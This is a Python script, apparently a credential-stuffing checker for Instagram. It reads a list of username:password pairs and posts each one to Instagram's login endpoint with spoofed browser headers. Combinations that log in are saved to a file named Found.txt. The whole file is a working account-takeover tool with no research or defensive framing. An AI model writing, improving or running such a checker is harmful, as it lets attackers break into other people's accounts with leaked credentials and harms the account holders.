
import requests, colorama as C, time, random, threading



red = C.Fore.RED
green = C.Fore.GREEN

reset = C.Fore.RESET

openFile = True

sec = input(f"{red}timer ->{reset}")
file = input(f"{red}database path list ->{reset}")

try:

    database = open(file, "r").read()
except FileNotFoundError:
    print(f"{red} File Not Found ..{reset}\n")



class cheacker:
    

    def __init__(self, username, password):

        self.username = username
        self.password = password

        self.run()

    

    def Login(self):

        username = self.username
        password = self.password

        url = "https://www.instagram.com/accounts/login/ajax/"


        headers = {
            'cookie': 'csrftoken=missing; mid=missing',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'x-csrftoken': 'missing'
        }

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}'
        }

        send = requests.post(url, headers=headers, data=payload)

        return send


    def run(self):

        username = self.username
        password = self.password

        

            
        send = self.Login().text

        if ('"authenticated":false') in send:
            print(f"{red}unAvailable -> {username} & {password}{reset}")
        elif ('"authenticated":true') in send:
            print(f"{green}Available -> {username} & {password}{reset}")

            with open("Found.txt", "a") as file:
                file.write(username + ":" + password + "\n")

                file.close()


timer = 0
while True:

    file = database.split("\n")

    username = str(file[timer]).split(":")[0]
    password = str(file[timer]).split(":")[1]


    cheacker(username, password)

    time.sleep(int(timer))

    timer +=1
